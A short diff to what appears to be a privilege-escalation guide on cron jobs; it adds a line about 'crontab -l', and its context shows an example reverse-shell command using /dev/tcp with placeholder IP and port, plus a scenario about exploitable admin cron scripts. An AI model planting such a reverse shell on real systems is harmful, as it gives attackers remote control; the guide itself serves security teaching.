@@ -342,6 +342,8 @@ Example of a reverse shell in a cron job:
 bash -i >& /dev/tcp/<IP_HERE>/<PORT_HERE> 0>&1
 ```
 
+You can also use the `crontab -l` command to list the current user’s crontab.
+
 Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level
 1. System administrators need to run a script at regular intervals.
 2. They create a cron job to do this
